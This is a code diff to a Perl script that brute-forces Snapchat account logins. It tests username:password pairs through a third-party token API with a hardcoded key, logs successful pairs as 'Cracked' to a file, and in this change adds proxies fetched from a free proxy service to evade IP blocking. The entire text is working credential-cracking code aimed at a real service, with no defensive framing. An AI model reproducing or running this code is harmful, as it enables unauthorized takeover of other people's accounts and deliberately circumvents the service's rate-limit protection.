@@ -57,52 +57,65 @@ chomp $username;
 			password => $password,
 			iat => time,
 		}, 'f3cdf4bbf206f5d572c6db13757c06fe');
-		$casper = LWP::UserAgent->new();
-		$casper->default_header('X-Casper-API-Key' => "dd3779d571409a67743c7e0e18a2cc04");
-		$casper->default_header('Content-Type' => "application/x-www-form-urlencoded; charset=UTF-8");
-		$casper->default_header('User-Agent' => "Dalvik/2.1.0 (Linux; U; Android 5.0; SM-G900F Build/LRX21T)");
-		$casper->default_header('Connection' => "Keep-Alive");
-		$requests = $casper->post('https://casper-api.herokuapp.com/snapchat/ios/login',{ jwt => $jwt });
-		if ($requests->content=~ /"code":200/) {
-			$snapchat = LWP::UserAgent->new();
-			$snapchat->default_header('X-Snapchat-Client-Token' => $requests->content=~ /"X-Snapchat-Client-Token":"(.+?)"/ );
-			$snapchat->default_header('User-Agent' => $requests->content=~ /"User-Agent":"(.+?)"/ );
-			$snapchat->default_header('X-Snapchat-Client-Auth-Token' => $requests->content=~ /"X-Snapchat-Client-Auth-Token":"(.+?)"/ );
-			$snapchat->default_header('Accept-Language' => "en-NZ;q=1");
-			$response = $snapchat->post('https://auth.snapchat.com/scauth/login',
-				{ 
-				password => $password,
-				timestamp => $requests->content=~ /"timestamp":"(.*?)"/,
-				username => $username,
-				req_token => $requests->content=~ /"req_token":"(.*?)"/
-				}
-				);
-			if ($response->content=~ /"logged":true,/) {
-				print "Cracked -> ($username:$password)\n";
-				open(R0T,">>Cracked.txt");
-				print R0T "\n($username:$password)\n";
-				close(R0T);
-				sleep(3);
-			}
-			else
-			{
-				if ($response->content=~ /not the right password/) {
-					print "Failed -> ($username:$password)\n";
+			$casper = LWP::UserAgent->new();
+			$casper->default_header('X-Casper-API-Key' => "dd3779d571409a67743c7e0e18a2cc04");
+			$casper->default_header('Content-Type' => "application/x-www-form-urlencoded; charset=UTF-8");
+			$casper->default_header('User-Agent' => "Dalvik/2.1.0 (Linux; U; Android 5.0; SM-G900F Build/LRX21T)");
+			$casper->default_header('Connection' => "Keep-Alive");
+			$requests = $casper->post('https://casper-api.herokuapp.com/snapchat/ios/login',{ jwt => $jwt });
+			if ($requests->content=~ /"code":200/) {
+				$prx = LWP::UserAgent->new();
+				$regex = $prx->get('https://gimmeproxy.com/api/getProxy');
+				$snapchat = LWP::UserAgent->new();
+				$snapchat->default_header('X-Snapchat-Client-Token' => $requests->content=~ /"X-Snapchat-Client-Token":"(.+?)"/ );
+				$snapchat->default_header('User-Agent' => $requests->content=~ /"User-Agent":"(.+?)"/ );
+				$snapchat->default_header('X-Snapchat-Client-Auth-Token' => $requests->content=~ /"X-Snapchat-Client-Auth-Token":"(.+?)"/ );
+				$snapchat->default_header('Accept-Language' => "en-NZ;q=1");
+				$snapchat->env_proxy;
+				$snapchat->proxy(['http', 'socks5'], $regex->content=~ /"curl":"(.+?)"/ );
+				$response = $snapchat->post('https://auth.snapchat.com/scauth/login',
+					{ 
+					password => $password,
+					timestamp => $requests->content=~ /"timestamp":"(.*?)"/,
+					username => $username,
+					req_token => $requests->content=~ /"req_token":"(.*?)"/
+					}
+					);
+				if ($response->content=~ /"logged":true,/) {
+					print "Cracked -> ($username:$password)/ Proxy: ";
+					print $regex->content=~ /"curl":"(.+?)"/;
+					print "\n";
+					open(R0T,">>Cracked.txt");
+					print R0T "\n($username:$password)\n";
+					close(R0T);
+					sleep(3);
 				}
 				else
 				{
-					if ($response->content=~ /find an account with that username./) {
-						print "Username Not Found -> ($username)\n";
+					if ($response->content=~ /not the right password/) {
+						print "Failed -> ($username:$password)/ Proxy: ";
+						print $regex->content=~ /"curl":"(.+?)"/;
+						print "\n";
 					}
 					else
 					{
-						print "Sorry, Blocked IP for many Requests\n";
+						if ($response->content=~ /find an account with that username./) {
+							print "Username Not Found -> ($username)/ Proxy: ";
+							print $regex->content=~ /"curl":"(.+?)"/;
+							print "\n";
+						}
+						else
+						{
+							print "Sorry, Blocked IP for many Requests/ Proxy: ";
+							print $regex->content=~ /"curl":"(.+?)"/;
+							print "\n";
+						}
 					}
 				}
 			}
-		}
-		else {
-			print "JWT [Casper API] Error";
-		}
+			else {
+				print "JWT [Casper API] Error";
+			}
+		
 	}
 }
